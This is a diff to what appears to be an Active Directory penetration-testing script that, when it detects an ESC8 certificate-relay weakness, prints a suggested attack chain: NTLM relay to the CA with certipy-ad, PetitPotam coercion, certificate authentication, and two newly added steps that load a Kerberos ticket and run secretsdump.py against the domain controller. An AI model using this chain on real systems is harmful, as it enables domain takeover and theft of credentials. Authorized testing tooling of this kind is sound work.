@@ -416,10 +416,11 @@ if [ ! -z "$CERTIPY_CMD" ]; then
             else
               echo -e "${GREY}       └─ /certsrv/ not reachable from this host — pivot may be required${NC}"
             fi
-            
             echo -e "${GREY}          1) certipy-ad relay -target https://${ESC8_CA_IP}/certsrv/certfnsh.asp -ca ${ESC8_CA_HOST%%.*} -template ${ESC8_FIRST_DC_TEMPLATE}${NC}"
             echo -e "${GREY}          2) petitpotam.py -d '$DOMAIN' -u '$AD_USER' -p '$PASSWORD' <RELAY_IP> $DC_IP${NC}"
             echo -e "${GREY}          3) certipy-ad auth -pfx <output>.pfx -dc-ip ${DC_IP}${NC}"
+            echo -e "${GREY}          4) export KRB5CCNAME=<output>.ccache${NC}"
+            echo -e "${GREY}          5) secretsdump.py -k -no-pass '$DOMAIN/${DC_HOSTNAME}\$@${DC_FQDN}'${NC}"
             ESC8_VULN=1
           fi
         fi
